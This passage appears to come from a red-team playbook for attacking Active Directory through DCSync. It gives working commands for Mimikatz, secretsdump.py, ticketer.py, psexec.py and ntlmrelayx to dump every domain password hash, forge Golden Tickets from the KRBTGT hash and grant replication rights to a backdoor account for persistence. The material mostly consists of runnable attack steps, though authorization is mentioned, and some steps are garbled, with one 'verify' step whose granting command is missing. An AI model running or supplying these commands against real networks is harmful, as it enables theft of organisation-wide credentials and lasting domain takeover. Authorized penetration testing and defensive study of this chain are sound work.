}
}

\subtree{
\title{Prerequisites}
\ul{
\li{Familiarity with red teaming concepts and tools}
\li{Access to a test or lab environment for safe execution}
\li{Python 3.8+ with required dependencies installed}
\li{Appropriate authorization for any testing activities}
}
}

\subtree{
\title{Objectives}
\ul{
\li{Identify accounts with DCSync (replication) rights in Active Directory}
\li{Perform DCSync using Mimikatz or Impacket's secretsdump.py}
\li{Extract the KRBTGT account hash for Golden Ticket creation}
\li{Dump all domain user password hashes for credential analysis}
\li{Forge Golden Tickets for persistent domain access}
\li{Grant DCSync rights to a controlled account for alternative persistence}
\li{Document the attack chain and persistence mechanisms}
}
}

\subtree{
\title{MITRE ATT&CK Mapping}
\ul{
\li{\strong{T1003.006} - OS Credential Dumping: DCSync}
\li{\strong{T1558.001} - Steal or Forge Kerberos Tickets: Golden Ticket}
\li{\strong{T1222.001} - File and Directory Permissions Modification: Windows}
\li{\strong{T1098} - Account Manipulation}
\li{\strong{T1078.002} - Valid Accounts: Domain Accounts}
}
}

\subtree{
\title{Workflow}
\subtree{
\title{Phase 1: Identify Accounts with DCSync Rights}
\ol{
\li{Enumerate principals with replication rights:}
}

\subtree{
\title{Using BloodHound Cypher query}
\p{MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN u.name, d.name}

\pre{\startverb
2. Using Impacket's FindDelegation or custom LDAP query:
\stopverb}
}

\subtree{
\title{Check with Impacket}
\p{findDelegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1}

\pre{\startverb
3. Default accounts with DCSync rights:
   - Domain Admins
   - Enterprise Admins
   - Domain Controllers group
   - SYSTEM on Domain Controllers

\stopverb}
}
}

\subtree{
\title{Phase 2: DCSync Credential Extraction}
\ol{
\li{Using Mimikatz (Windows):}
}

\subtree{
\title{Dump Domain Admin}
\p{mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"}
}

\subtree{
\title{Dump all domain accounts}
\p{mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"}

\pre{\startverb
2. Using Impacket secretsdump.py (Linux):
\stopverb}
}

\subtree{
\title{Dump all credentials}
\p{secretsdump.py domain.local/admin:'Password123'@10.10.10.1}
}

\subtree{
\title{Dump specific user}
\p{secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1}
}

\subtree{
\title{Dump only NTLM hashes (no Kerberos keys)}
\p{secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1}
}

\subtree{
\title{Using Kerberos authentication}
\p{export KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local}

\pre{\startverb

\stopverb}
}
}

\subtree{
\title{Phase 3: Golden Ticket Creation}
\ol{
\li{Using Mimikatz with extracted KRBTGT hash:}
}

\subtree{
\title{Create with specific group memberships}
\p{mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \ /sid:S-1-5-21-XXXXXXXXXX \ /krbtgt:<krbtgt_ntlm_hash> \ /groups:512,513,518,519,520 /ptt"}

\pre{\startverb
2. Using Impacket ticketer.py (Linux):
\stopverb}
}

\subtree{
\title{Create Golden Ticket}
\p{ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \ -domain domain.local administrator}
}

\subtree{
\title{Use the ticket}
\p{export KRB5CCNAME=administrator.ccache psexec.py -k -no-pass domain.local/administrator@DC01.domain.local}

\pre{\startverb

\stopverb}
}
}

\subtree{
\title{Phase 4: Persistence via DCSync Rights}
\ol{
\li{Grant DCSync rights to a controlled account for persistence:}
}

\subtree{
\title{Verify rights were added}
\p{Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }}

\pre{\startverb
2. Using ntlmrelayx.py for automated DCSync rights escalation:
\stopverb}
}

\subtree{
\title{Relay authentication to add DCSync rights}
\p{ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user}

\pre{\startverb

\stopverb}
}
}
}

